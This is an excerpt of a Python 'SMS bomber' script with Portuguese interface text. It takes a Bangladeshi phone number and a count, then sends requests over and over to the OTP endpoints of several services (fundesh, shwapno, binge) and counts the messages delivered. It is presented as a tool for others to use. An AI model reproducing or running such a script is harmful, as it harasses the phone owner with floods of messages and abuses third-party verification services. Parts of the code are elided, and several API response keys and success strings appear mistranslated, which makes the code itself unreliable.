...
def update():
	banner()
	print(blue,'O bombardeiro SMS está funcionando...'.center(62,' '))
	print()
	print(blue,f'Total enviado :  {total_sent}  OTP'.center(60,' '))
	print(green,f'Sucesso    :  {success}  OTP'.center(60,' '))
...
def fundesh_send(num):
	...
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('status')=='OTP_SENT_SUCESSO':
		success+=1
		update()
		return
	failed+=1
...
def shwapno(num):
	...
	resp = requests.get(url)
	total_sent+=1
	if 'é enviado para o seu número de celular' in resp.text:
		success+=1
		update()
		return
	failed+=1
...
def binge(num):
	...
	resp = requests.post(url, headers=headers, data=data)
	total_sent+=1
	if json.loads(resp.text).get('é_sucesso')==True:
		success+=1
		update()
		return
	failed+=1
...
def goodbye():
	...
	print(blue,f'Total enviado :  {total_sent}  OTP'.center(60,' '))
	print(green,f'Sucesso    :  {success}  OTP'.center(60,' '))
	print(red,f'Falha     :  {failed}  OTP'.center(60,' '))
	print()
	print(green,'Obrigado por usar minha ferramenta.'.center(62,' '))
	exit()


try:
	banner()
	number=str(input(f'{blue} [*] Digite o número do celular (sem +88): '))
	if len(number)<11 or len(number)>11:
		print(f'\n{red} [*] Por favor insira um número válido. Por exemplo: 01919472855')
		exit()
	try:
		amount=int(input(f'{green} [*] Insira a quantidade de SMS: '))
	except ValueError:
		print(f'\n{red} [*] Por favor, insira apenas números, não letras!')
		exit()
...
while True:
	try:
		...
		print(f'\n{red} [*] Algo deu errado! Certifique-se de estar conectado com a Internet')
		exit()
	except Exception as e:
		print(red,e)
		exit()
